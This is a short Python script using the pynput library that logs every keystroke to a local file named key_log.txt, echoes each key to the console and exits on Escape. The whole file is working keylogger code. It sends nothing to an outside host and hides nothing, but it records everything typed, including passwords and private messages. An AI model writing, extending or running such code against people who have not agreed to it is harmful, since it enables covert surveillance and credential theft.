from pynput import keyboard
import os

# Get the directory of the script
script_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(script_dir, "key_log.txt")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
        print(f"Key pressed: {key.char}")  # Debug print
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")
        print(f"Special key pressed: {key}")  # Debug print

def on_release(key):
    if key == keyboard.Key.esc:
        print("Escape key pressed, exiting...")  # Debug print
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
